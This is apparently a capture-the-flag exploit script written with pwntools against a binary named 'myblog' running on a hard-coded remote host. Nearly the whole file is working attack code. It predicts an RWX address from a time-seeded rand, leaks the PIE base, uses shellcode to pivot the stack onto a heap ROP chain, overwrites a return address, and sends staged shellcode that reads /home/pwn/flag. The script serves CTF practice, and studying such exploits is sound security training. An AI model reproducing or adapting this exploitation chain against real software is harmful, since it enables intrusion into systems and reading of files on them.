#!/usr/bin/python
from pwn import *
import sys
import ctypes

ctypes.cdll.LoadLibrary("libc.so.6")
libc = ctypes.CDLL("libc.so.6")

HOST = "159.65.125.233"
PORT = 31337

def write_blog(content, author):
	r.sendline("1")
	r.recvline()
	r.send(content)
	r.recvline()
	r.send(author)
	r.recvuntil("Exit\n")	

def del_blog(idx):
	r.sendline("2")
	r.recvline()
	r.send(str(idx))
	r.recvuntil("Exit\n")

def show_blog(newauth):
	r.sendline("3")
	r.recvuntil("Old Owner : ")
	LEAK = r.recvline()[:-1]
	r.recvline()
	r.send(newauth)
	r.recvuntil("Exit\n")

	return LEAK

def get_pie_leak(overwrite_ret=False, ret=0, rbp=0):
	r.sendline("31337")
	r.recvuntil("gift ")
	LEAK = int(r.recvline().strip(), 16)
	
	if not overwrite_ret:
		r.sendline("0")
		r.recvuntil("Exit\n")	
	else:
		payload = "A"*8
		payload += p64(rbp)		
		payload += p64(ret)
		r.send(payload)

	return LEAK

def exploit(r):
	log.info("Initialize srand")	

	ADDR = libc.rand() & 0xFFFFF000

	log.info("RWX section at        : %s" % hex(ADDR))

	r.recvuntil("Exit\n")

	PIE = get_pie_leak()
	e.address = PIE - 0xef4

	log.info("PIE leak              : %s" % hex(PIE))
	log.info("PIE                   : %s" % hex(e.address))

	log.info("Initialize stager shellcode to pivot to heap ropchain")

	context.arch = "amd64"

	SC = """		
		push [rbp]		
		pop rsp
		pop rbp
		leave
		ret
		"""

	show_blog(asm(SC))

	log.info("Create ropchain to read bigger shellcode to rwx section")

	payload = p64(ADDR+0x8)
	payload += p64(e.address + 0xf20)
	payload += p64(0xdeadbeef)

	write_blog(payload, "B"*6)
	
	get_pie_leak(True, ADDR, ADDR+0x8)

	log.info("Send second stager shellcode to read unlimited shellcode")

	SC = """
		xor rax, rax
		xor rdi, rdi
		mov rsi, rsp		
		xchg rdx, r11
		syscall
		jmp next		
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop		
		next:
	"""

	payload = asm(SC)[:16]
	payload += p64(ADDR)

	r.send(payload)
	
	log.info("Send final shellcode to read/open/write flag")

	SC = """
		mov rax, 257
		mov rdi, -100
		mov rsi, %d
		xor rdx, rdx
		xor rcx, rcx
		syscall

		xchg rdi, rax
		xor rax, rax
		mov dl, 100
		syscall

		xor rax, rax
		mov al, 1
		mov rdi, 1
		syscall

		""" % (ADDR+0xe0)

	payload = asm(SC)
	payload += "\x90"*(200-len(payload))
	payload += "/home/pwn/flag\x00"

	r.send(payload)

	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./myblog")

	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		libc.srand(libc.time(0))
		exploit(r)
	else:
		r = process("./myblog")
		libc.srand(libc.time(0))
		print util.proc.pidof(r)
		pause()
		exploit(r)
